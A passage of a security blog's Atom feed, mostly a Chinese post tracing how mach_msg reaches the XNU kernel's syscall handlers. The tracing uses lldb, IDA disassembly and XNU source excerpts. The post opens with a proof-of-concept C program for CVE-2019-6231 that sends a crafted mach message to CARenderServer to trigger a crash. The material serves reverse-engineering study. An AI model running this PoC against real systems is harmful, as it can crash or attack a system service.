DpIpVOXWK/DLptHUs3wForytmIsUMSscwbvmFtz7/KA5A/0uc9pcmNhifxG50N8eWafmoqNpu0EhrjHsQbMah2DlER49MycTyEmlOaJcb8sQynMsjcQhhVNKYRibrXbIKBmThHsrz7v0hXgEjnXnjbB+szo1WdWvLSBmQAhNSuLWPnTpkaCS8Gntkinr/5xP9Xiq4bJP7mt/Vs6yKgwZTtVZfRi8sQxBv+UFop4HjhsBw3KwXUA7vuEgo+KHBoq5P8NigMJyl7n7oHsQs7PtwOBUwuwEwKPwmFUZkTdlsQocbuhHy0OaaTtV83kiRb7kUvK3lU11C71Fa2mbvuke5jumygqOhLyNnRkBUf3qHjRxvpdFYJOxjT1qmz1EA8zfHbPeMSH/DythxWhzU8eRlNb9CLzfRaP5fckwSGKN1QSX1GzNpd/iw6Lx1Y13vBjHIuWD5NkrrugMC42VM23RP3FjxHdxjTMJfTDZCPCwJJIhL1TCvUaOad24Tt/sLunJpBrrEsQ4WPLF3n83xWAWyKSj1I4oCXU4vmriOTQU9HVmOvgxDW092xSuLmoSefTnum0+2UV1DAGwq9XMSi5lXwAGL76N1ph80emRyEqHUHJEjZ8Y5au1K2tRYYkfFfwvu4Wf6C5UcSLtrCJpddWDqENQ4A==</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
</feed>
